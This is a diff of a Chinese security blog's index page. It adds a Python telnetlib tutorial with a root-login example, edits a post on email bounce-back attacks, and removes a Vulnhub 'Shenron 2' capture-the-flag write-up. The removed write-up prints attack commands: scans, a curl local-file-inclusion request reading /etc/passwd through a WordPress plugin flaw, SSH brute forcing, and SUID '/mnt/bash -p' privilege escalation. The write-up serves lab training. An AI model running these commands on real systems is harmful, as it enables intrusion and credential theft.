@@ -86,6 +86,71 @@
 
     
         <h2 class="title">
+            <a href="/2023/07/24/Python-Telnet/">
+                Python telnet模块说明
+            </a>
+        </h2>
+    
+    <time>
+        Jul 24, 2023
+    </time>
+    <section class="content">
+        <h1><span id="python-telnet模块说明">Python telnet模块说明</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41629756/article/details/102784236">三番鱼</a> 并作补充</p>
+</blockquote>
+<h2><span id="程序要点说明">程序要点说明</span></h2><blockquote>
+<p>python实现telnet客户端的六个关键问题及其答案是：<br>使用什么库实现telnet客户端—-telnetlib</p>
+</blockquote>
+<blockquote>
+<p>1.怎么连接主机—-两种方法，一种是在实例化时传入ip地址连接主机（tn &#x3D; telnetlib.Telnet(host_ip,port&#x3D;23)），第二种是，先不传参数进行实例化再用open方法连接主机（我这里使用的方法）</p>
+</blockquote>
+<blockquote>
+<p>2.怎么输入用户名密码—-我们使用read_untilb函数监听，出现标志后使用write方法向服务端传输用户名密码</p>
+</blockquote>
+<blockquote>
+<p>3.怎么执行命令—-仍然是使用write方法向服务端传送命令，不管向服务端传送什么数据都用write；不过要注意需要编码成bytes类型<br>注：该Telnet.write()函数采用字节字符串。这可以通过仅编码字符串（您尝试编码函数的返回值）来提供，例如：</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session.write(<span class="string">&quot;administrator\n&quot;</span>.encode(<span class="string">&#x27;ascii&#x27;</span>))</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>或者通过为字符串添加前缀b如下：</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> telnetlib</span><br><span class="line"> </span><br><span class="line">host = <span class="string">&quot;192.168.1.0&quot;</span></span><br><span class="line">port = <span class="number">23</span></span><br><span class="line">timeout = <span class="number">100</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">with</span> telnetlib.Telnet(host, port, timeout) <span class="keyword">as</span> session:</span><br><span class="line">    session.write(<span class="string">b&quot;administrator\n&quot;</span>)</span><br><span class="line">    session.write(<span class="string">b&quot;password\n&quot;</span>)</span><br><span class="line">    session.write(<span class="string">b&quot;reboot\n&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>4.怎么获取命令执行结果—-使用read_very_eager()方法，该方法获取的内容是上次获取之后本次获取之前的所有输入输出；由于获取到的是bytes类型要decode解码一下</p>
+</blockquote>
+<blockquote>
+<p>5.怎么退出telnet—退出telnet使用write方法向服务器提交exit命令即可</p>
+</blockquote>
+<h2><span id="程序源码清单">程序源码清单</span></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> telnetlib</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TelnetClient</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,</span>):</span><br><span class="line">        self.tn = telnetlib.Telnet()</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 此函数实现telnet登录主机</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">login_host</span>(<span class="params">self,host_ip,username,password</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># self.tn = telnetlib.Telnet(host_ip,port=23)</span></span><br><span class="line">            self.tn.<span class="built_in">open</span>(host_ip,port=<span class="number">23</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            logging.warning(<span class="string">&#x27;%s网络连接失败&#x27;</span>%host_ip)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="comment"># 等待login出现后输入用户名，最多等待10秒</span></span><br><span class="line">        self.tn.read_until(<span class="string">b&#x27;login: &#x27;</span>,timeout=<span class="number">10</span>)</span><br><span class="line">        self.tn.write(username.encode(<span class="string">&#x27;ascii&#x27;</span>) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">        <span class="comment"># 等待Password出现后输入用户名，最多等待10秒</span></span><br><span class="line">        self.tn.read_until(<span class="string">b&#x27;Password: &#x27;</span>,timeout=<span class="number">10</span>)</span><br><span class="line">        self.tn.write(password.encode(<span class="string">&#x27;ascii&#x27;</span>) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">        <span class="comment"># 延时两秒再收取返回结果，给服务端足够响应时间</span></span><br><span class="line">        time.sleep(<span class="number">2</span>)</span><br><span class="line">        <span class="comment"># 获取登录结果</span></span><br><span class="line">        <span class="comment"># read_very_eager()获取到的是的是上次获取之后本次获取之前的所有输出</span></span><br><span class="line">        command_result = self.tn.read_very_eager().decode(<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Login incorrect&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> command_result:</span><br><span class="line">            logging.warning(<span class="string">&#x27;%s登录成功&#x27;</span>%host_ip)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            logging.warning(<span class="string">&#x27;%s登录失败，用户名或密码错误&#x27;</span>%host_ip)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 此函数实现执行传过来的命令，并输出其执行结果</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">execute_some_command</span>(<span class="params">self,command</span>):</span><br><span class="line">        <span class="comment"># 执行命令</span></span><br><span class="line">        self.tn.write(command.encode(<span class="string">&#x27;ascii&#x27;</span>)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">        time.sleep(<span class="number">2</span>)</span><br><span class="line">        <span class="comment"># 获取命令结果</span></span><br><span class="line">        command_result = self.tn.read_very_eager().decode(<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line">        logging.warning(<span class="string">&#x27;命令执行结果：\n%s&#x27;</span> % command_result)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 退出telnet</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">logout_host</span>(<span class="params">self</span>):</span><br><span class="line">        self.tn.write(<span class="string">b&quot;exit\n&quot;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    host_ip = <span class="string">&#x27;192.168.220.129&#x27;</span></span><br><span class="line">    username = <span class="string">&#x27;root&#x27;</span></span><br><span class="line">    password = <span class="string">&#x27;abcd1234&#x27;</span></span><br><span class="line">    command = <span class="string">&#x27;whoami&#x27;</span></span><br><span class="line">    telnet_client = TelnetClient()</span><br><span class="line">    <span class="comment"># 如果登录结果返加True，则执行命令，然后退出</span></span><br><span class="line">    <span class="keyword">if</span> telnet_client.login_host(host_ip,username,password):</span><br><span class="line">        telnet_client.execute_some_command(command)</span><br><span class="line">        telnet_client.logout_host()</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>python 库 telnetlib: Telnet客户端:<br>telnetlib模块提供的Telnet类实现了Telnet协议。它为协议字符和telnet选项提供符号常量，符号常量来源于arpa&#x2F;telnet.h去掉了前缀TELOPT_</p>
+<p>1.Telnet.read_all(): 读取所有数据直到EOF，阻塞直到连接关闭<br>2.Telnet.read_some(): 读取至少一个字节的数据，除非EOF。如果没有数据则阻塞。<br>3.Telnet.read_until(expected[, timeout]):常用于登录，与write连用；读取直到遇到了给定的字符串expected或超时秒数<br>4.Telnet.read_very_eager(): 非阻塞地读取。连接关闭或者没有数据时触发EOFError异常，返回b’’如果没有数据。 获取命令执行结果：获取的内容是上次获取之后本次获取之前的所有输入输出<br>5.Telnet.read_eager(): 读取已有数据(快)<br>6.Telnet.read_lazy(): 读取已有数据(懒)<br>7.Telnet.read_sb_data(): 返回的SB&#x2F;SE pair(suboption begin&#x2F;end)之间的数据，此方法永远不会阻塞<br>8.Telnet.open(host[,port[,timeout]]): 连接到主机，可选的第二个参数是默认为标准的Telnet端口（23）的端口号。可选的超时参数（以秒指定）阻塞操作（如连接尝试超时（如果不指定，默认使用全局超时设置））<br>9.Telnet.msg(msg[, *args]): 当调试级别为&gt;0打印调试信息<br>10.Telnet.set_debuglevel(debuglevel)：设置调试级别。debuglevel越高信息越多。<br>11.Telnet.close() 关闭连接<br>12.Telnet.get_socket()：返回套接字供内部使用<br>13.Telnet.fileno(): 返回套接字对象内部使用的文件描述<br>14.Telnet.write(buffer): 常用于执行命令；写入字符串到套接字，加倍IAC的任何字符。连接关闭时可能触发OSError异常。<br>15.Telnet.interact(): 交由用户控制<br>16.Telnet.mt_interact(): 多线程版本的interact()<br>17.Telnet.expect(list[, timeout]): 读取直到匹配正则表达式项列表中的一个。list是一个正则表达式列表，包含编译(regx对象)或未编译（字节字符串）。timeout以秒为单位，默认值为无限期阻塞。返回元祖的三个项目：</p>
+<ul>
+<li>1.index为匹配正则表达式的位置；</li>
+<li>2.match对象</li>
+<li>3.此时读了的字节<br>18.Telnet.set_option_negotiation_callback(callback):每次从输入流读取telnet选项时，调用callback,后续步骤不会执行。</li>
+</ul>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Python/" rel="tag">Python</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
             <a href="/2023/07/24/Nacos-AccessToken/">
                 云原生组件Nacos新型红队手法研究
             </a>
@@ -577,8 +642,8 @@
 <h2><span id="杂记">杂记</span></h2><blockquote>
 <p>有生活常识的朋友都知道，当我们寄出一封信件的时候，如果收信人的地址变更或一些特殊原因。你所寄出的信件将会被原址退回。实际上电子邮件也是有这个退信功能的。不过这个便利的功能却被网络黑客发现并加以利用，邮件退信攻击有成为了危害邮件安全的一个难题。</p>
 <p>所谓邮件退信攻击，是将预攻击的对象伪造成发件人地址，而收件人设置为一系列其他邮件域并不存在的账号，这样当邮件大量发送，例如通过僵尸网络，由于收件人不存在，邮件系统将产生大量的退信给发件人地址。该发件人地址所属的真实服务器将收到大量的退信，增加服务器的负荷，也容易使该公司的邮件服务器被列入黑名单。</p>
-<p>邮件退信攻击在程度上有所区别，上面介绍的这种攻击，被攻击者可能一天之内收到数百上千封各种退信。一般用户碰到的邮件退信攻击属于骚扰性质，垃圾邮件发送者在发送垃圾邮件时，常常随机的设置发件人，例如其中包括<a href="mailto:&#98;&#x6f;&#x62;&#x6f;&#64;&#x61;&#x62;&#99;&#46;&#99;&#111;&#x6d;">&#98;&#x6f;&#x62;&#x6f;&#64;&#x61;&#x62;&#99;&#46;&#99;&#111;&#x6d;</a>，当大量发送垃圾邮件时，有些邮件可能是以<a href="mailto:&#x62;&#x6f;&#x62;&#x6f;&#64;&#97;&#98;&#99;&#46;&#x63;&#111;&#x6d;">&#x62;&#x6f;&#x62;&#x6f;&#64;&#97;&#98;&#99;&#46;&#x63;&#111;&#x6d;</a>发送的，则bobo就可能收到退信，有时一天只有几封或几十封，但总是不断，让人十分郁闷。</p>
-<p>退信信息通常比较有规律，例如发件人为空，或者为<a href="mailto:&#77;&#x41;&#x49;&#x4c;&#x45;&#x52;&#x2d;&#68;&#x41;&#x45;&#77;&#79;&#78;&#64;&#120;&#x78;&#x78;&#x2e;&#x63;&#x6f;&#x6d;">&#77;&#x41;&#x49;&#x4c;&#x45;&#x52;&#x2d;&#68;&#x41;&#x45;&#77;&#79;&#78;&#64;&#120;&#x78;&#x78;&#x2e;&#x63;&#x6f;&#x6d;</a>，主题一般为Undelivered Mail Returned等。有些用户采用关键字的技术将退信予以阻断，或者干脆限定阻止空发件人，但是这经常会把正常的退信也阻止掉，导致信息不畅。</p>
+<p>邮件退信攻击在程度上有所区别，上面介绍的这种攻击，被攻击者可能一天之内收到数百上千封各种退信。一般用户碰到的邮件退信攻击属于骚扰性质，垃圾邮件发送者在发送垃圾邮件时，常常随机的设置发件人，例如其中包括<a href="mailto:&#98;&#111;&#x62;&#x6f;&#64;&#97;&#x62;&#99;&#46;&#99;&#111;&#x6d;">&#98;&#111;&#x62;&#x6f;&#64;&#97;&#x62;&#99;&#46;&#99;&#111;&#x6d;</a>，当大量发送垃圾邮件时，有些邮件可能是以<a href="mailto:&#x62;&#111;&#98;&#111;&#64;&#x61;&#98;&#x63;&#46;&#99;&#111;&#109;">&#x62;&#111;&#98;&#111;&#64;&#x61;&#98;&#x63;&#46;&#99;&#111;&#109;</a>发送的，则bobo就可能收到退信，有时一天只有几封或几十封，但总是不断，让人十分郁闷。</p>
+<p>退信信息通常比较有规律，例如发件人为空，或者为<a href="mailto:&#77;&#x41;&#x49;&#x4c;&#69;&#82;&#x2d;&#x44;&#x41;&#x45;&#77;&#x4f;&#78;&#64;&#120;&#x78;&#x78;&#x2e;&#x63;&#111;&#109;">&#77;&#x41;&#x49;&#x4c;&#69;&#82;&#x2d;&#x44;&#x41;&#x45;&#77;&#x4f;&#78;&#64;&#120;&#x78;&#x78;&#x2e;&#x63;&#111;&#109;</a>，主题一般为Undelivered Mail Returned等。有些用户采用关键字的技术将退信予以阻断，或者干脆限定阻止空发件人，但是这经常会把正常的退信也阻止掉，导致信息不畅。</p>
 <p>一般而言，退信占一个公司的邮件量5%以上，这其中绝大部分是垃圾退信。如何防止收到这种垃圾退信，避免邮件退信攻击呢?</p>
 <p>采用SPF或domain-key的技术。这两种技术的原理相似。例如sohu.com的SPF记录是sohu.com text &#x3D; “v&#x3D;spf1 ip4:61.135.130.0&#x2F;23 ip4:61.135.132.0&#x2F;23 (。。。sohu邮件服务器所属IP)all”;如果有人冒用sohu发送垃圾邮件，收件方如果采用了SPF过滤技术，就能判定这是假冒的垃圾邮件，将不会给sohu发送DNR了。</p>
 <p>遗憾的是很多服务器不做SPF验证，因此即使您的公司设置了SPF记录，也不能阻止垃圾退信。</p>
@@ -954,94 +1019,6 @@
 <p><img src="/2022/08/24/Shenron-3/22.png" alt="image-"></p>
 <p>3.在&#x2F;root目录下发现flag，即root.txt：</p>
 <p><img src="/2022/08/24/Shenron-3/23.png" alt="image-"></p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Shenron/" rel="tag">Shenron</a><a class="tag-none-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="tag-none-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2022/08/24/Shenron-2/">
-                Shenron 2
-            </a>
-        </h2>
-    
-    <time>
-        Aug 24, 2022
-    </time>
-    <section class="content">
-        <h1><span id="shenron2">Shenron:2</span></h1><h2><span id="一-基本信息">一、基本信息</span></h2><blockquote>
-<h4><span id="名称shenron2">名称：shenron:2</span></h4><h4><span id="发布日期202145">发布日期：2021.4.5</span></h4><h4><span id="作者shubham-mandloi">作者：Shubham mandloi</span></h4><h4><span id="系列shenron">系列：shenron</span></h4><h4><span id="推特shubhammandloi">推特：@shubhammandloi</span></h4></blockquote>
-<h2><span id="二-靶机简介">二、靶机简介</span></h2><blockquote>
-<h4><span id="flags">Flags：</span></h4><p>root:&#x2F;root&#x2F;root.txt</p>
-<h4><span id="难度简单">难度：简单</span></h4></blockquote>
-<h2><span id="三-文件信息">三、文件信息</span></h2><blockquote>
-<h4><span id="文件名shenron-2ova">文件名：shenron-2.ova</span></h4><h4><span id="文件大小37gb">文件大小：3.7GB</span></h4><h4><span id="下载地址httpscybersecs3cn-north-1amazonawscomcnimageshenronshenron-2ova">下载地址：</span></h4><h4><span id="md5-2883845ff2e1e122e1b1e75cf9a4b4e1">MD5: 2883845FF2E1E122E1B1E75CF9A4B4E1</span></h4><h4><span id="sha1-e66bda7ab264d1fea2103801bb422731f34f0599">SHA1: E66BDA7AB264D1FEA2103801BB422731F34F0599</span></h4></blockquote>
-<h2><span id="四-镜像信息">四、镜像信息</span></h2><blockquote>
-<h4><span id="格式virtual-machine-virtualbox-ova">格式：Virtual Machine (Virtualbox - OVA)</span></h4><h4><span id="操作系统linuxdebain">操作系统：Linux(debain)</span></h4></blockquote>
-<h2><span id="五-网络信息">五、网络信息</span></h2><blockquote>
-<h4><span id="dhcp服务可用">DHCP服务：可用</span></h4><h4><span id="ip地址自动分配">IP地址：自动分配</span></h4></blockquote>
-<h2><span id="六-环境配置">六、环境配置</span></h2><blockquote>
-<p>1.将靶机shenron2和攻击机kali2021在VirtualBox下设置为桥接模式，使用DHCP分配ip地址：</p>
-<p><img src="/2022/08/24/Shenron-2/1.png" alt="image-"></p>
-</blockquote>
-<h2><span id="七-攻略步骤">七、攻略步骤</span></h2><h3><span id="信息探测">信息探测</span></h3><blockquote>
-<p>1.因为是没有直接告知我们靶机ip的，所以要先进行主机探测，先查看下kali分配到的ip，在进行网段扫描，命令如下，得到靶机ip为192.168.3.134：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig，查看kali分配到的ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shenron-2/2.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.3.134/24，扫描靶机ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shenron-2/3.png" alt="image-"></p>
-<p>2.再进行端口扫描，发现只开放22，80及8080端口，访问主页查看源码，没有太多线索：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sC -sV -p- --min-rate=1000 192.168.3.136 | tee nmapscan，端口扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shenron-2/4.png" alt="image-"></p>
-<p><img src="/2022/08/24/Shenron-2/5.png" alt="image-"></p>
-<p>3.最后再进行一下目录扫描，没有发现太多值得关注的目录：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.3.136/ -x html,php,bak,txt --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt，目录扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shenron-2/6.png" alt="image-"></p>
-</blockquote>
-<h3><span id="wordpress漏洞利用">Wordpress漏洞利用</span></h3><blockquote>
-<p>1.先把解析写入host，然后访问192.168.3.136:8080，发现是wordpress搭建的页面，可以用wpscan尝试寻找下漏洞：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/hosts</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shenron-2/7.png" alt="image-"></p>
-<p><img src="/2022/08/24/Shenron-2/8.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://shenron:8080 --api-token $(cat /opt/wpscan-api) --enumerate</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shenron-2/9.png" alt="image-"></p>
-<p>2.发现有Site Editor的漏洞，我们可以看一下如何利用：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit Site Editor 1.1.1</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shenron-2/10.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://shenron:8080/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd，得到有两个用户和密码hash</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shenron-2/11.png" alt="image-"></p>
-</blockquote>
-<h3><span id="ssh密码爆破初步提权">SSH密码爆破，初步提权</span></h3><blockquote>
-<p>1.用hydra进行jenny爆破，得到密码登录SSH：</p>
-<p><img src="/2022/08/24/Shenron-2/12.png" alt="image-"></p>
-<p><img src="/2022/08/24/Shenron-2/13.png" alt="image-"></p>
-<p>2.在jenny用户下，查看suid，可以发现&#x2F;usr&#x2F;bin&#x2F;Execute，查看文件（需要导入本地查看，不然是elf乱码）：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -type f -perm -u=s 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shenron-2/14.png" alt="image-"></p>
-<p><img src="/2022/08/24/Shenron-2/15.png" alt="image-"></p>
-<p>3.我们可以知道这个文件的作用是将&#x2F;bin&#x2F;bash复制到&#x2F;mnt&#x2F;bash下，并给予shenron用户权限，那么我们可以利用这个文件：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Execute</span><br><span class="line">/mnt/bash -p</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shenron-2/16.png" alt="image-"></p>
-</blockquote>
-<h3><span id="root提权">root提权</span></h3><blockquote>
-<p>1.查看.pass文件，我们能发现一串类似base编码的字符串，利用base32解密发现是shenron用户登录的密码：</p>
-<p><img src="/2022/08/24/Shenron-2/17.png" alt="image-"></p>
-<p>2.登录shenron后，查看权限，发现可以直接提权到root：</p>
-<p><img src="/2022/08/24/Shenron-2/18.png" alt="image-"></p>
-<p>3.在&#x2F;root目录下，可以找到flag，即root.txt：</p>
-<p><img src="/2022/08/24/Shenron-2/19.png" alt="image-"></p>
 </blockquote>
 
 
